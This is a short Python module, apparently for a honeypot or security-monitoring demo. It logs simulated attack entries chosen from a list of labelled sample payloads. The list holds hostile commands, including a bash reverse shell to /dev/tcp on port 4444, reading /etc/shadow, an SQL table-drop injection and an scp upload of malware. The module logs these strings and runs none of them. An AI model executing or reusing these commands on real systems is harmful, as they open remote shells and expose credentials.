import random
from datetime import datetime

MALICIOUS_PAYLOADS = [
    {"type": "Reverse Shell", "code": "bash -i >& /dev/tcp/192.168.1.10/4444 0>&1"},
    {"type": "Keylogger", "code": "python -c 'import pynput; ...'"},
    {"type": "Ransomware", "code": "echo 'Encrypting files...'"},
    {"type": "Brute Force", "code": "for pass in passwords: ssh user@host -p 22"},
    {"type": "Port Scan", "code": "nmap -p 1-65535 192.168.1.1"},
    {"type": "SQL Injection", "code": "'; DROP TABLE users; --"},
    {"type": "Exploit CVE", "code": "exploit -m cve-2021-1234 --target=host"},
    {"type": "Malware Upload", "code": "scp malware.exe user@host:/tmp/"},
    {"type": "SSH Banner Grab", "code": "nc host 22"},
    {"type": "Credential Harvesting", "code": "cat /etc/shadow"}
]

malicious_log = []

# Registra un código malicioso ficticio
def log_malicious_code(ip, username, payload=None):
    if not payload:
        payload = random.choice(MALICIOUS_PAYLOADS)
    entry = {
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "ip": ip,
        "username": username,
        "type": payload["type"],
        "code": payload["code"]
    }
    malicious_log.append(entry)
    return entry

# Devuelve los últimos N códigos maliciosos
def get_recent_malicious(n=20):
    return malicious_log[-n:] 